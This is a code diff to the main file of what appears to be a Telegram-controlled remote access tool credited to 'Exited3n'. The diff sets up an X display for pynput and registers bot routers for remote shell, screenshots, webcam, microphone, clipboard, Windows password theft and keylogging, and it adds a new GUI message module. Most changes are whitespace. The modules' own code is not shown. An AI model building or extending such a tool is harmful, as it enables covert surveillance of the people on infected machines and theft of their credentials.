@@ -17,6 +17,7 @@ os.makedirs(LOG_DIR, exist_ok=True)
 logging.basicConfig(level=logging.INFO, filename=LOG_FILE,
                     format="%(filename)s:%(lineno)d #%(levelname)-8s" "[%(asctime)s] - %(name)s - %(message)s")
 
+
 def check_display_access(display):
     """Check if the display is accessible."""
     try:
@@ -28,6 +29,7 @@ def check_display_access(display):
         logging.warning(f"Display {display} is not accessible: {e}")
         return False
 
+
 def grant_xhost_access():
     """Grant access to the local X server using xhost."""
     try:
@@ -35,6 +37,7 @@ def grant_xhost_access():
         logging.info("Granted local access to X server via xhost")
     except subprocess.CalledProcessError as e:
         logging.error(f"Failed to grant xhost access: {e}")
+
 
 def find_free_display(start=99, max_tries=10):
     """Find an available display number for Xvfb."""
@@ -51,16 +54,17 @@ def find_free_display(start=99, max_tries=10):
                 return display
     raise RuntimeError("No free display found")
 
+
 def setup_xvfb():
     """Start Xvfb and set DISPLAY environment variable if needed."""
     current_display = os.environ.get('DISPLAY', ':0')
-    
+
     # First, try to use the current display
     if check_display_access(current_display):
         logging.info(f"Using existing display {current_display}")
         os.environ['DISPLAY'] = current_display
         return
-    
+
     # Try granting access to the current display
     logging.info(f"Attempting to grant access to {current_display}")
     grant_xhost_access()
@@ -68,13 +72,13 @@ def setup_xvfb():
         logging.info(f"Using display {current_display} after granting access")
         os.environ['DISPLAY'] = current_display
         return
-    
+
     # Fallback to Xvfb
     logging.info(f"Existing display {current_display} unavailable, starting Xvfb")
     try:
         display = find_free_display()
         logging.info(f"Selected display {display} for Xvfb")
-        
+
         # Start Xvfb
         logging.info(f"Starting Xvfb on display {display}")
         xvfb_process = subprocess.Popen(
@@ -82,17 +86,18 @@ def setup_xvfb():
             stdout=subprocess.PIPE, stderr=subprocess.PIPE
         )
         time.sleep(2)  # Wait for Xvfb to initialize
-        
+
         # Check if Xvfb is running
         if xvfb_process.poll() is not None:
             stderr = xvfb_process.stderr.read().decode()
             raise RuntimeError(f"Xvfb failed to start: {stderr}")
-        
+
         os.environ['DISPLAY'] = display
         logging.info(f"Xvfb started successfully on {display}")
     except Exception as e:
         logging.error(f"Failed to setup Xvfb: {e}")
         raise
+
 
 # Setup Xvfb or existing display before importing modules that use pynput
 logging.info("Setting up display")
@@ -105,7 +110,8 @@ except Exception as e:
 
 # Import modules after setting DISPLAY
 from aiogram import Dispatcher, types
-from helpers import ip_addr, ps, screenshot, shell, sys_info, up_down, webcam, handlers, file_man, mic, clipboard, win_passwords, keylogger
+from helpers import ip_addr, ps, screenshot, shell, sys_info, up_down, webcam, handlers, file_man, mic, clipboard, \
+    win_passwords, keylogger, gui_messege
 from cfg import bot as bot
 
 # Author : Exited3n
@@ -128,11 +134,14 @@ dp.include_router(mic.router)
 dp.include_router(clipboard.router)
 dp.include_router(win_passwords.router)
 dp.include_router(keylogger.router)
+dp.include_router(gui_messege.router)
 logging.info("All routers included")
+
 
 @dp.errors()
 async def errors_handler(update: types.Update, exception: Exception):
     logging.error(f'❌ Error: {update}: {exception}')
+
 
 async def main():
     try:
@@ -144,6 +153,7 @@ async def main():
         logging.info("Bot stopped")
     finally:
         await bot.session.close()
+
 
 if __name__ == "__main__":
     logging.info('Bot starting...')
